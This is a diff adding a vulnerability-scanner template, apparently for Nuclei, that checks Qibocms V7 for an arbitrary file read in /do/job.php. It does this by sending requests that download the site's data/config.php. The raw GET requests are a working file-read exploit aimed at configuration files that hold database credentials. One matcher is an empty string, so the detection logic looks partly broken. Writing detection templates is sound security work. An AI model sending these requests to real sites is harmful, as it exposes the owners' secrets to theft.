@@ -1,0 +1,45 @@
+id: poc-qibocms-v7-job-php-anyfile-read
+info:
+  name: Qibocms V7 job.php Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Qibocms V7 has a vulnerability in job.php that allows arbitrary file reads. This template tests for the presence of the vulnerability by attempting to read sensitive files.
+  tags: file-read,qibocms
+
+variables:
+  path: "{{base64('data/config.ph<')}}"
+
+http:
+  - raw:
+      - |
+        GET /do/job.php?job=download&url=data/config.ph< HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+
+  - raw:
+      - |
+        GET /do/job.php?job=download&url={{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "php"
+          - "$webdb"
+      - type: word
+        part: header
+        words:
+          - "ph<"
